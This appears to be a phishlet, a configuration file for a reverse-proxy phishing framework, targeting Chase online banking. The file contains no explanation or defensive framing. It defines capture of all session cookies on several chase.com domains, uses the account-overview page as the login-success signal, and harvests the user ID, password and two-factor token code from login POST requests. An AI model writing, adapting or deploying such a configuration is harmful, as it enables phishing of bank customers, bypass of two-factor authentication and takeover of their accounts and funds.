auth_tokens:
  - domain: '.chase.com'
    keys: ['.*,regexp']
  - domain: 'secure05b.chase.com'
    keys: ['.*,regexp']
  - domain: 'sites.chase.com'
    keys: ['.*,regexp']
auth_urls:
  - '/overviewAccounts/*'
credentials:
  username:
    key: 'auth_userId'
    search: '(.*)'
    type: 'post'
  password:
    key: '^auth_passwd$'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'auth_tokencode'
      search: '(.*)'
      type: 'post'

